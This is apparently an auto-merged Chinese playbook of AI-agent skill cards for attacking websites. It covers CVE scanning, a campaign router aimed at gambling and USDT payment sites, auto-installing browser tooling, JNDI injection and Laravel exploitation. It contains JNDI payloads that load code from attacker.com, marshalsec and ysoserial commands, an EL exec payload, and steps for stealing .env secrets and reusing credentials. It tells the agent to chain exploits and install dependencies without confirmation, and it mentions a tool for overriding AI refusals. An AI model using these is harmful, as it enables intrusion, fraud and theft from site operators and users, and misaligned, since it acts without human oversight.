@@ -1,0 +1,727 @@
+---
+title: "打网站手法.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 打网站手法.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/1day-nuclei-kit/SKILL.md`
+- `/root/.hermes/skills/security/campaign-router/SKILL.md`
+- `/root/.hermes/skills/security/chrome-automation/SKILL.md`
+- `/root/.hermes/skills/security/jndi-injection/SKILL.md`
+- `/root/.hermes/skills/security/laravel-pentest/SKILL.md`
+- `/root/.hermes/skills/security/php-debug-mode-exploitation/SKILL.md`
+
+## 汇总内容
+
+### 1day-nuclei-kit
+
+来源：`/root/.hermes/skills/security/1day-nuclei-kit/SKILL.md`
+
+# 1day / Nuclei 作业（Cursor Skill）
+
+<!-- MERGED-INDEX:START -->
+## 归档子卡（已合并 23 张）
+
+- 索引：`references/index.md`
+- 加载：`skill_view(name='1day-nuclei-kit', file_path='references/legacy/<name>.md')`
+- 子卡脚本/字典仍在原目录（索引里给了绝对路径），可直接 `read_file` / `terminal`。
+- **先按本卡判据决策**；本卡不够时才展开对应子卡，不要一次全读。
+<!-- MERGED-INDEX:END -->
+
+> **本机核验（2026-10-21）**：旧文里的 `tools/1day-kit/od_kit.py`、`docs/playbooks/*` 在当前仓**不存在**，别按空路径跑。  
+> `vuln_find "CVE/产品"` 先定位真实 PoC；nuclei 已装 **v3.11.1 + 13,619 模板**（在 `/usr/local/bin/nuclei`），缺别的工具用 `tool_get <name>` 现场补。
+
+
+## 何时用
+
+- 指纹明确、要快速过已知 CVE/misconfig
+- 需要查本地 `exploitarium` 研究型 PoC 是否相关
+- 跟 [cvebase.io](https://cvebase.io/) 近期 KEV / 在野洞补手法
+- Tsecbench / 靶场「漏洞利用」类题的默认入口之一
+
+## 真源（按序）
+
+1. `tools/1day-kit/od_kit.py`（`learn` / `explain` / `nuclei`）
+2. **`docs/playbooks/Nuclei引擎学习手册.md`**（官方 v3 YAML + 本库三层；先学这个）
+3. `docs/playbooks/1day与Nuclei作业手册.md`（短作业清单）
+4. `docs/playbooks/1day在野洞情报手法.md` · **`CVE情报日报手法.md`** · 当日 `CVE日报-YYYY-MM-DD.md` · `docs/intel/cve-daily/*.json`
+5. `docs/playbooks/打网站手法.md` · 同目录各栈手法卡（Metabase/UpSnap/MRBS/Grafana/Jenkins/XXL-JOB 等）
+6. `poc-db/exploitarium/`（研究 PoC，非自动扫）
+7. 广谱发现可并行 `pentest-swarm`；出洞后交专用 Skill
+8. `references/77169-intel-2026q3.md`（**77169/华盟 2026Q3 新CVE弹药清单**：A级未认证RCE/SQLi、B级LPE、C级边界、D级移动端、E级手法、F级工具；抽查8个CVE已NVD核验）
+9. `references/77169-intel-2026q3-full.md`（**151条全量高价值索引**：110个CVE、代码块/PoC/GitHub计数 + 摘要 + 原文链接；已剔新闻与汽车安全系列）
+10. `references/77169-full-site-cve-index.md`（**全站500个CVE总索引**：2016-2026全部技术类文章去重，含标题/原文链接/文章数；429个为新增未吸收编号）
+11. `references/2026-10-cve-poc-repos.md`（**2026-10-16~19 PoC 仓库核验**：4条真新增 + 4条旧洞纠错 + 公开索引源；NVD/GitHub created_at 双核验，只链接不贴步骤）
+12. `references/abraxas-0day-index-2026-10.md`（**abraxas 0day 工厂索引**：2026-10-11~18 共 152 个仓库/26 产品族，pfSense 53、OpenMeetings 12、Spark 9、OPNsense 7、Jellyfin 4；**未分配 CVE 的自研 0day，版本为作者测试版本**，只记攻击面原语）
+
+## 强制步骤
+
+1. 目标在 scope（情报查询可无目标；扫站必须有）。
+2. `python3 tools/1day-kit/od_kit.py doctor`（缺二进制：`bash scripts/install-arsenal-macos.sh`）
+3. 要学引擎/YAML：`od_kit.py learn` · `explain --id <模板>` · 手册 `Nuclei引擎学习手册.md`
+4. 模板空：`od_kit.py update-templates`（写入 `tools/1day-kit/nuclei-templates/`）
+5. 情报（可选）：`od_kit.py cvebase trending` / `lookup --cve CVE-… --docs`
+6. 扫：先 `nday_route.py`，再  
+ `od_kit.py nuclei --url <URL> --case <案卷> --custom-only`  
+ 或 `-t tools/1day-kit/custom-templates/<id>.yaml`（与手法卡同一写法）。  
+ 然后才 `--tags cve,rce`。hits 里的专卡优先于广谱 nuclei。
+7. 本地 PoC：`od_kit.py search --q <组件>` → `show --id <目录名>`
+8. 证据：`exports/bot-recovery/<案卷>/测绘/1day/`
+
+## cvebase 快捷
+
+```bash
+export CVEBASE_API_KEY="cvb_..." # 可选；否则匿名约 10/日
+python3 tools/1day-kit/od_kit.py cvebase trending
+python3 tools/1day-kit/od_kit.py cvebase lookup --cve CVE-2026-72898 --docs
+```
+
+业务站栈（Metabase/UpSnap/MRBS/Grafana/Jenkins/XXL-JOB/Jeecg/Shiro/Druid/ThinkPHP/宝塔PMA/用友致远/WP/Laravel…）：见 `打网站手法.md` + 对应手法卡 + `custom-templates/` 
+「今天新 CVE」完整落盘：切 Skill **`cve-daily-intel`**（JSON+日报+P0 专卡+Skill），禁止只口头汇总。 
+UpSnap → `upsnap-unauth-rce`；MRBS → `mrbs-ssrf`；GeoServer → `geoserver-jsonarraycontains-sqli`；FreePBX → `freepbx-unauth-rce`；WP 插件 8/15 窗 ATO/假付 → `wordpress-plugin-unauth-takeover`；Ray Dashboard → `ray-dashboard-unauth`；GitLab GraphQL → `gitlab-graphql-unauth`；**Gitea / diffpatch / CVE-2026-60004** → `gitea-diffpatch-rce`；MLflow webhook → `mlflow-ssrf-webhook`；Zimbra SNMP → `zimbra-snmp-rce`；ICEcoder → `icecoder-unauth-rce`；JetEngine → `jetengine-unauth-rce`；Ollama → `ollama-unauth`；Langflow → `langflow-unauth-rce`；Flowise → `flowise-internal-header-rce`；CVE-2024-4577 → `php-cgi-cve-2024-4577`；xmlrpc.php → `wordpress-xmlrpc-surface`；信任头 → `trusted-ip-header`；开放重定向 → `open-redirect-chain`；**Oracle WebLogic Proxy / CVE-2026-21962** → 指纹模板 `weblogic-proxy-cve-2026-21962.yaml`。HITCON 学洞 → `hitcon-zeroday-intel`。 
+Java 面一条分流：`python3 tools/ops/java_web_surface_probe.py -u <授权站> --case <案卷>` 
+设备/边缘（LoadMaster/Tomcat集群/VeloCloud/PAN…）：情报可留，网站案默认降权
+
+## 不要做
+
+- 未授权扫网段 / 未授权 dump
+- 把完整 nuclei-templates 硬 clone 进 `tools/vendor`
+- 命中业务指纹后仍只跑 nuclei 结案（Actuator/支付等要切专用链）
+- 把 cvebase 匿名配额浪费在无目的广搜上
+
+---
+
+<!-- 补充视角: vuln-scanner (兄弟技能库 2026-09-12) -->
+
+
+# Vulnerability Scanner Workflow
+
+Auto-chain without confirmation:
+
+Phase 1 — Enumerate:
+  `skills/network-pentest/scripts/port_scanner.py` → all open ports
+  `skills/network-pentest/scripts/service_enum.py` → service versions
+
+Phase 2 — CVE Match:
+  Cross-reference service versions against known CVEs.
+  Prioritize: RCE > privilege escalation > information disclosure.
+
+Phase 3 — Exploit match:
+  `skills/exploit-dev/scripts/shellcode_gen.py` → for
+
+…（截断，全文见来源卡）
+
+### campaign-router
+
+来源：`/root/.hermes/skills/security/campaign-router/SKILL.md`
+
+# Campaign Router — 智能作战路由器
+
+> **本机核验（2026-10-21 彻底回滚后）**：完整的 231 个历史 `tools/ops/*.py` 中，**启用面 114/123 名、227/241 引用 = 94.2%**；9 个启用面缺口，13 个擅自写的实现已全部隔离。归档面仍有 106 个 disabled/legacy 名字无文件。现在补的是高覆盖执行层，共 **125 个真实入口**。
+>
+> 真实可执行层：
+> - `tools/ops/kit_run.py` — `check` / `list` / `run --kit web|recon` / `report`（web = whatweb + nuclei + ffuf；recon = subfinder + nmap + whatweb）
+> - `tools/ops/auto_campaign.py` — `plan` 只读菜单；`run` 是 kit 的薄封装
+> - `tools/ops/case_report.py`、`evidence_gate.py`、`object_matrix.py`、`scope_lint.py`
+> - **125 个被现卡引用的真实 ops 名**（路由/探针 + 高频补链 + 兼容入口；目录内另有 28 个直达 symlink）
+> - 底层 29 个纯标准库脚本：`.claude/skills/pentest-redteam/scripts/tools/`
+>
+> 运行前必须显式 `--scope`（不会自动把目标主机写成授权范围）：
+>
+> ```bash
+> python3 tools/ops/kit_run.py check
+> python3 tools/ops/kit_run.py run --kit web -u https://授权站 --case <案卷> --scope 授权域名
+> python3 tools/ops/case_report.py --case <案卷>
+> ```
+>
+其余 106 个 `tools/ops/*.py` 历史名仍无文件（全库 231 个唯一名，125 个已实现，1,264/1,539 处引用 = 82.1%；**启用卡 114/123 名、227/241 引用 = 94.2%**，9 个缺口）；菜单当“能力索引”读，执行前先 `python3 tools/ops/coverage_gate.py --active --strict` 或 `ls`，不存在就用现有适配器/二进制替代，禁止硬跑。
+
+## 触发条件
+
+用户给出一个新目标（URL/域名），且需要决定"用哪些工具/怎么打"时使用。
+关键词：新目标、开始测试、怎么打、先从哪里入手、计划一下、作战计划、全扫一遍。
+
+**成套入口**（散装探针的顺序+交接）：
+
+```
+tools/ops/kit_run.py
+```
+
+```bash
+python3 tools/ops/kit_run.py list
+python3 tools/ops/kit_run.py run --kit web -u https://授权站 --case <案卷> --scope 授权域名
+```
+
+`auto_campaign.py` 仍是指纹菜单；已经像网站/Java/PHP/盘口时用 kit，不要 31 个工具平铺。
+
+## 核心工具（菜单）
+
+```
+tools/ops/auto_campaign.py
+```
+
+**菜单**（指纹 → 并列工具，不交接）。不知道栈时用。已经像网站/Java/PHP/盘口时改用上面的 kit_run。
+
+## 立即执行步骤
+
+### 第 0 步：军械库检索（强制，先于任何工具）
+
+```bash
+python3 /root/.hermes/arsenal/skill_find.py "<目标指纹/症状>" --top 8
+```
+
+`[D]` 卡按返回的 `load:` 行加载：`skill_view(name='<目录卡>', file_path='references/legacy/<卡名>.md')`。  
+
+**已知产品/版本/CVE 时加查漏洞库**：
+
+```bash
+vuln_find "<产品 版本/CVE/未授权/RCE>" --top 8
+```
+
+`[POC]` 先读 `read:` 的 README/analysis，确认前置条件再执行；不要把 PoC 当通用 RCE。
+
+缺工具现场补，不要停：`tool_get --check` → `tool_get <name>`；装完 `command -v` 验证。
+
+先确认有没有现成打法、前置条件和脚本，再决定 `kit_run` / `auto_campaign`；禁止因为常驻索引里没有就自己重写。
+
+### 第 1 步：生成作战计划（只读，1-5 秒）
+
+```bash
+python3 tools/ops/auto_campaign.py plan -d <目标域名>
+```
+
+可选参数：
+- `--admin <URL>`：已知后台地址（跳过猜测）
+- `--case <案卷名>`：输出到 `/root/cases/<案卷名>/`（与 case_ledger / kit_run 一致）
+
+输出：
+- 5 个阶段的工具列表（Phase 0 侦察 → 1 绕过 → 2 漏洞 → 3 接管 → 4 社工）
+- 每个工具的触发原因 + 完整命令
+- 目标指纹摘要（CDN/WAF/技术栈/功能模块）
+
+### 第 2 步：执行（可选，自动运行全链）
+
+```bash
+# 全部执行
+python3 tools/ops/auto_campaign.py run -d <目标域名>
+
+# 只执行侦察阶段
+python3 tools/ops/auto_campaign.py run -d <目标域名> --phases 0
+
+# 执行侦察+绕过
+python3 tools/ops/auto_campaign.py run -d <目标域名> --phases 0,1
+
+# 先预览再执行（dry-run）
+python3 tools/ops/auto_campaign.py run -d <目标域名> --dry-run
+
+# 绑定现有案卷
+python3 tools/ops/auto_campaign.py run -d <目标域名> --case wldzylbot_20260810
+```
+
+## 工具激活规则（指纹 → 工具）
+
+| 指纹特征 | 激活工具 |
+|---------------------|--------------------------------------------------------------|
+| 任何目标 | osint_recon + test_subdomain_enum + js_secret_hunter + dirbrute_probe + nday_route + jwt_gql_probe + 1day_nuclei |
+| Cloudflare/CDN | origin_recon + cf_backup_bypass + ip_whitelist_bypass |
+| 后台 403/IP 白名单 | ip_whitelist_bypass（全 7 个向量） |
+| 博彩站 | yudao_appapi_probe + port_admin_scan + tg_cmd_enum + api_dispatcher + logic_vuln + ws_probe + stored_xss + agent_probe + social_engineer |
+| Java/Spring | actuator_probe + fastjson_probe + java_web_surface_probe（含 cnoa 国产 OA 指纹）；heapdump 可达或已有 hprof → **立刻** heap_cred_scan（蓝鸟蜘蛛） |
+| 通达/泛微/用友/致远 | java_web `--stack cnoa` + Playbook `docs/playbooks/用友与致远OA手法.md` |
+| CF/CDN 缓存头 | `cache_poison_probe.py` → `web-cache-poisoning` |
+| 支付且像 USDT | `usdt_attr_hijack.py chain-scan`（只读）并行 bind-dup |
+| 盘口 IDOR 阴 | `ato_reset_withdraw_probe.py`（任意 code + BOLA + 提现三件套，自控号） |
+| TG 云控 `main.wasm` / 掩码票 | `tg_cloud_panel_probe` 第四族 + `jwt_gql_probe --token 掩码票` |
+| 案卷有 Chrome.rar / cookies.sqlite / fingerprint.json | `has_browser_loot` → `from-case --url`（分诊 + 整包回放授权 URL）；活会话再 `session_import` |
+| 点名 PwnKit / GodPotato / Log4Shell / ADCS ESC / shell.zip 手法 | `hypothesis_route.py --signal` → `shell包红队手法.md`（不部署 opus-injector） |
+| Claude/Codex 拒答、助手没身份、要部署 CLAUDE.md | **manual**：`se_inject.py` 身份注入版已按操作员要求隔离；不提供替代注入器，走官方通道或手工配置 |
+| Harbor / 容器仓库 | `nday_route`（指纹 `has_harbor`） |
+| Jeecg/Shiro/Druid | java_web_surface_probe → 对应手法卡（Shiro 默认做 L2 弱密钥碰撞） |
+| ThinkPHP / PHP | thinkphp_surface_probe（默认 Client-IP 差分 + `.env`；`--no-probe-ip-header` 才关） |
+| TP3 README / `ApiUserFenxiao` / `chk_update` / 剪贴板劫持 | `tp3_fenxiao_probe.py`（禁止 message_delete OR；WAF 拦 TP5 不算结案
+
+…（截断，全文见来源卡）
+
+### chrome-automation
+
+来源：`/root/.hermes/skills/security/chrome-automation/SKILL.md`
+
+# 浏览器自动化（测绘引擎）
+
+本卡接到**现有作业链**，不是再装一套 `~/.claude` 的 agent-browser。
+
+## 何时用
+
+- 要看得到窗口的本机 Chrome（远程调试 9222）
+- 授权站要渲染 / 过 CF / 带着会员 Cookie 点页面
+- 用户说「浏览器自动化环境」
+
+## 分流（先看这张表）
+
+| 场景 | 走 |
+|------|-----|
+| 授权站抓页 / JS 渲染 / CF | Skill **`scrapling`** · `tools/scrapling/bin/scrapling_fetch.py` |
+| 已有 Cookie / 会员态导入 | `python3 tools/ops/session_pipeline.py --domain … --input cookies.json --case …` |
+| 图形码 | Skill `captcha-ocr` |
+| 极验 / 滑块 | Skill `geetest-captcha-bypass` · `captcha_auto.py` |
+| 本机有头 Chrome + CDP | 本卡下面的启动命令 |
+| Windows 桌面（IDA / x64dbg） | Skill `browser-automation` 的桌面段 |
+| JS 断点 / Hook | Skill `js-reverse` |
+
+禁止：把个人 Chrome 主号整份档案同步到作业出口再打站（漏个人 Cookie）。作业用独立 profile 或 `session_pipeline` 导入的授权会话。
+
+## 本机有头 Chrome（CDP）
+
+```bash
+# 空作业 profile，调试口 9222（默认不拷个人主号）
+bash .cursor/skills/chrome-automation/scripts/start-chrome-mac.sh
+# 只有你明确要求时才： bash .../start-chrome-mac.sh --import-personal
+```
+
+启动后：
+
+```bash
+# 授权站渲染抓页（优先本库 Scrapling，不要改走 ~/.claude 安装脚本）
+python3 tools/scrapling/bin/scrapling_fetch.py https://授权站 --mode browser --case <案卷>
+# CF
+python3 tools/scrapling/bin/scrapling_fetch.py https://授权站 --mode stealthy --solve-cf --case <案卷>
+```
+
+`agent-browser` 仅在你本机已经装好、且目标在 scope 时用；缺依赖走 Scrapling / Playwright，**不要**跑 `auto-install-mac.sh` 去装 Rust/pnpm。
+
+## 会员态
+
+```bash
+python3 tools/ops/session_pipeline.py \
+ --domain 授权域 --input cookies.json --case <案卷> \
+ --require-session --require-cf
+```
+
+## 强制
+
+1. 目标在 scope。
+2. 抓页/过 CF 默认 Scrapling；本卡只补「有头 Chrome / CDP」。
+3. 滑块不走 OCR。
+4. 桌面逆向 GUI 不走本卡。
+
+## 真源
+
+- 手法：`docs/playbooks/打网站手法.md`
+
+
+---
+
+## 外部库增量（2026-10-11 分享包）
+
+## ⚠️ CRITICAL: Automatic Installation & Dependency Check
+
+**BEFORE using this skill, ALWAYS run the auto-installation check:**
+
+This skill automatically checks and installs all required dependencies without user confirmation. The installation process verifies:
+- agent-browser repository and binary
+- Node.js and pnpm
+- Playwright Chromium
+- Rust toolchain (cargo)
+- Native binary compilation
+
+**Auto-installation workflow:**
+
+```bash
+# Mac: Run auto-install script
+bash ~/.claude/skills/chrome-automation/scripts/auto-install-mac.sh
+
+# Windows: Run auto-install script (PowerShell)
+powershell -ExecutionPolicy Bypass -File "$HOME\.claude\skills\chrome-automation\scripts\auto-install-windows.ps1"
+```
+
+**The script will:**
+1. Check if agent-browser binary exists and works
+2. Install missing dependencies automatically (pnpm, Rust, etc.)
+3. Clone repository if not present
+4. Build native binary with proper Rust toolchain
+5. Verify installation success
+
+**Critical rules:**
+- ❌ DO NOT fall back to using built-in browser tools (browser_use_desktop)
+- ✅ MUST run auto-install script before any browser automation
+- ✅ Only proceed with browser automation AFTER successful installation
+- ✅ Script handles all dependency checks automatically
+
+**Why agent-browser is required:**
+- Provides real-time visual feedback in user's actual Chrome browser
+- Allows user to see and interact with automation in progress
+- Offers precise element selection and interaction capabilities
+- Built-in browser tools are NOT a substitute for this skill's functionality
+
+## Quick Start
+
+### First-time setup (automatic)
+
+**Run the auto-install script first:**
+
+```bash
+# Mac
+bash ~/.claude/skills/chrome-automation/scripts/auto-install-mac.sh
+
+# Windows (PowerShell)
+powershell -ExecutionPolicy Bypass -File "$HOME\.claude\skills\chrome-automation\scripts\auto-install-windows.ps1"
+```
+
+The script automatically handles:
+- Repository cloning
+- Dependency installation (pnpm, Playwright)
+- Rust toolchain setup
+- Native binary compilation
+
+### Connect and control Chrome
+
+**IMPORTANT: Use the start-chrome script to preserve login states across sessions**
+
+```bash
+# Mac: Start Chrome with persistent profile (RECOMMENDED)
+# This preserves your login states, cookies, and settings
+bash ~/.claude/skills/chrome-automation/scripts/start-chrome-mac.sh
+
+# Windows: Start Chrome with persistent profile (PowerShell)
+powershell -ExecutionPolicy Bypass -File "$HOME\.claude\skills\chrome-automation\scripts\start-chrome-windows.ps1"
+
+# Use agent-browser with --cdp flag
+cd /Users/jyxc-dz-0100272/Documents/agent-browser
+AGENT_BROWSER_HOME=/Users/jyxc-dz-0100272/Documents/agent-browser \
+./bin/agent-browser --cdp 9222 snapshot -i
+```
+
+**What the start-chrome script does:**
+1. First run: Creates a dedicated automation profile at `~/Library/Application Support/Google/Chrome-Automation`
+2. First run: Imports your existing Chrome configuration (
+
+…（截断，全文见来源卡）
+
+### jndi-injection
+
+来源：`/root/.hermes/skills/security/jndi-injection/SKILL.md`
+
+# jndi-injection（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/jndi-injection/SKILL.md`
+- 手法：`docs/playbooks/打网站手法.md`
+- 工具：`python3 tools/ops/java_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name jndi-injection`
+
+---
+
+# SKILL: JNDI Injection — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert JNDI injection techniques. Covers lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets. Base models often confuse JNDI injection with general deserialization — this file clarifies the distinct attack surface.
+
+## 0. RELATED ROUTING
+
+- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)
+- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation
+
+---
+
+## 1. CORE MECHANISM
+
+JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).
+
+**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.
+
+```java
+// Vulnerable code pattern:
+String name = request.getParameter("resource");
+Context ctx = new InitialContext();
+Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
+```
+
+---
+
+## 2. ATTACK VECTORS
+
+### RMI (Remote Method Invocation)
+
+```
+rmi://attacker.com:1099/Exploit
+```
+
+Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
+```java
+// Attacker's RMI server returns:
+Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
+// JVM downloads http://attacker.com/Exploit.class and instantiates it
+```
+
+### LDAP
+
+```
+ldap://attacker.com:1389/cn=Exploit
+```
+
+Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.
+
+LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).
+
+### DNS (detection only)
+
+```
+dns://attacker-dns-server/lookup-name
+```
+
+Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.
+
+---
+
+## 3. JDK VERSION CONSTRAINTS AND BYPASS
+
+| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
+|---|---|---|---|
+| < 8u121 | YES | YES | Direct class loading |
+| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
+| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
+| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |
+
+### Post-8u191 Bypass: LDAP → Serialized Gadget
+
+Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.
+
+```bash
+# ysoserial JRMPListener approach:
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
+# Then JNDI lookup points to: rmi://attacker:1099/whatever
+```
+
+### Post-8u191 Bypass: BeanFactory + EL
+
+When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:
+
+```
+javaClassName: javax.el.ELProcessor
+javaFactory: org.apache.naming.factory.BeanFactory
+forceString: x=eval
+x: Runtime.getRuntime().exec("id")
+```
+
+---
+
+## 4. TOOLING
+
+### marshalsec — JNDI Reference Server
+
+```bash
+# Start LDAP server serving a remote class:
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
+
+# Start RMI server:
+java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099
+
+# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
+```
+
+### JNDI-Injection-Exploit (all-in-one)
+
+```bash
+java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
+# Automatically starts RMI + LDAP servers with multiple bypass strategies
+```
+
+### Rogue JNDI
+
+```bash
+java -jar RogueJndi.jar --command "id" --hostname attacker.com
+# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
+```
+
+---
+
+## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)
+
+### Mechanism
+
+Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `
+
+…（截断，全文见来源卡）
+
+### laravel-pentest
+
+来源：`/root/.hermes/skills/security/laravel-pentest/SKILL.md`
+
+# Laravel 应用渗透（debug 泄露 / 版本指纹 / RCE 决策）
+
+## 触发条件
+- 目标返回 Laravel 特征: `laravel_session`/`XSRF-TOKEN` cookie、Whoops 异常页（`<!--\n\n\n<Exception>: ...Stack trace...` 注释式 HTML）、`/api/user` 500、`Route [login] not defined`
+- debug 模式开启 = 异常页含完整堆栈 + **Environment Variables 面板**（.env 全量泄露）
+
+## 1. .env 泄露（Whoops env 面板）
+- 触发任意异常（如未认证路由 `GET /api/user` → 500 `InvalidArgumentException: Route [login] not defined`）→ Whoops 页底部 Environment Variables 表格含 APP_KEY/DB_*/MAIL_* 等 **实际值**
+- 提取: 键名列和值列分两列, 按行配对解析（sf-dump span）
+- 已实测泄露: APP_KEY(base64:...)、DB_HOST/DB_DATABASE/DB_USERNAME/DB_PASSWORD、APP_URL、SERVER_ADDR(内网 IP)
+- 辅助: `/composer.json`、`/vendor/composer/installed.json`、`/.env`、`/storage/logs/laravel.log` 常被 nginx deny(404) — 别浪费时间, Whoops 页更快
+
+## 2. 版本指纹（异常页行号对比 GitHub 源码）
+- 关键行号: `UrlGenerator.php` 中 `throw new InvalidArgumentException("Route [login] not defined.")` 的行号 **随版本单调变化**
+- 实测行号表(比对 raw.githubusercontent.com/laravel/framework/<tag>/src/Illuminate/Routing/UrlGenerator.php):
+
+| Laravel | 行号 |
+|---|---|
+| 5.5.50 | 305 |
+| 5.6.40 | 372 |
+| **5.8.38** | **388** |
+| 6.20.44 | 437 |
+| 7.30.6 | 420 |
+| 8.83.27 | 444 |
+| 9.52.0 | 467 |
+
+- 目标行号 389 → **5.8.x**（小版本差异 ±1 行）
+- 辅助指纹: `RouteCollection.php` methodNotAllowed throw 行号(255 附近, 各版本差异小, 参考性弱); `fideloper/proxy` TrustProxies 在堆栈中 = 5.x-6.x 特征(7+ 内置)
+- 方法: 下载目标 tag 的 UrlGenerator.php → grep `Route [` 所在行 → 与异常页行号匹配
+
+## 3. RCE 决策矩阵（按版本, 已实测排除项）
+| CVE | 适用 | 快速验证 |
+|---|---|---|
+| CVE-2018-15133 (APP_KEY unserialize RCE) | **≤5.6.30** | PHPGGC Laravel/RCE{1,3,5,7,9} + 自写 Encrypter(AES-256-CBC+HMAC, iv/value/mac JSON base64) 发 `X-XSRF-TOKEN`; 响应无变化=已修复 |
+| CVE-2019-11043 (PHP-FPM RCE) | PHP 7.1-7.3 + nginx fastcgi_split_path_info | 先验 `index.php/xxx` 返回非 404(PATH_INFO 可达); 再扫 `?a=%0a*n` 找 `Primary script unknown` 500 — 全 200=不适用 |
+| CVE-2021-3129 (Ignition RCE) | Laravel 7+ 且 _ignition 可达 | `/_ignition/health-check` — nginx 404=被挡; 5.8 用 Whoops 无 Ignition |
+| 修复后 APP_KEY | 解密已拿到的加密 cookie/session | EncryptCookies 5.6.30+ 不再 unserialize — 仅解密用 |
+
+- **结论规则**: Laravel 5.8/6.x + debug 但 RCE 全堵 = 大概率无公开 RCE, 转横向（DB 密码复用/宝塔/同源资产）
+
+## 4. APP_KEY 利用（无 RCE 时）
+- 解密任何 Laravel 加密值（cookie、加密字段）— 需先拿到密文
+- DB 密码等凭据 → 密码复用横向（注意 MySQL 用户常绑定 localhost）
+- APP_URL/SERVER_ADDR 泄露 → 源站/内网拓扑
+
+## 5. 路由枚举 oracle（debug 模式）
+- **catch-all 路由**（如短链服务 `/{code}`）: 任意 POST → `MethodNotAllowedHttpException` Whoops 页; 任意 GET 无效码 → 控制器返回体(如 `0`) — 区分真实路由靠响应体差异, 不是状态码
+- nginx 常对特殊字符(引号/%)路径直接 404 — SQL 注入经 PATH_INFO/query 被路径层拦截时, 换编码或放弃
+- 敏感路径(composer/vendor/storage/.env)nginx deny 404 — 用 `index.php/<path>` 或 PATH_INFO 变体试
+
+## Pitfalls
+- `Route [login] not defined` = 认证中间件 redirect 到不存在的 login 路由 — 常见于无登录功能的内部 API, 本身是信息(路由存在但 auth 配置残缺)
+- 短链/落地页类应用常无登录功能 → 无 cookie 可解, APP_KEY 价值低
+- Cloudflare 对 curl 返回 0 字节 200 — 用浏览器通道或带完整浏览器头重试
+- 版本指纹失败时: 异常页堆栈里的中间件链(Kernel.php 行号/中间件类名)也是线索
+
+## references
+- `references/version-fingerprint-case.md` — 8gtg.vip 案例: 行号验证全过程 + CVE 实测排除记录
+
+## 真源
+
+- 手法：`docs/playbooks/打网站手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
+
+---
+
+<!-- 补充视角: laravel-app-pentest (兄弟技能库 2026-09-12) -->
+
+---
+name: laravel-app-pentest
+description: "Laravel渗透时使用。触发: laravel_session, APP_DEBUG, Ignition。"
+version: 1.0.0
+license: MIT
+metadata:
+    related_skills: [thinkphp-modern-pentest, web-cms-pentest, surveyengine-knowledge-pack]
+---
+
+# Laravel 应用渗透(debug 泄露/版本指纹/RCE 决策)
+
+来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\laravel-pentest\SKILL.md`)。配套 playbooks: 镜像 `docs/playbooks/` 下 PHP 相关。
+
+## 触发条件
+- Cookie `laravel_session`/`XSRF-TOKEN`;Whoops 异常页(`<!--\n\n\n<Exception>: ...Stack trace...` 注释式 HTML);`/api/user` 500;`Route [login] not defined`
+- debug 开启 = 异常页含完整堆栈 + **Environment Variables 面板**(.env 全量泄露)
+
+## 1. .env 泄露(Whoops env 面板)
+- 触发任意异常(未认证路由 `GET /api/user` → 500 `Route [login] not defined`)→ Whoops 底部 Environment Variables 含 **APP_KEY/DB_*/MAIL_* 实际值**
+- 提取: 键名列+值列按行配对(sf-dump span)
+- 实测泄露: APP_KEY(base64:...)、DB_HOST/DB_DATABASE/DB_USERNAME/DB_PASSWORD、APP_URL、SERVER_ADDR(内网 IP)
+- `/composer.json`、`/vendor/composer/installed.json`、`/.env`、`/storage/logs/laravel.log` 常被 nginx deny — 别浪费时间,Whoops 页更快
+
+## 2. 版本指纹(异常页行号对比 GitHub 源码)
+- `UrlGenerator.php` 中 `throw new InvalidArgumentException("Route [login] not defined.")` 行号**随版本单调变化**:
+| Laravel | 行号 |
+|---|---|
+| 5.5.50 | 305 |
+| 5.6.40 | 372 |
+| 5.8.38 | 388 |
+| 6.20.44 | 437 |
+| 7.30.6 | 420 |
+| 8.83.27 | 444 |
+| 9.52.0 | 467 |
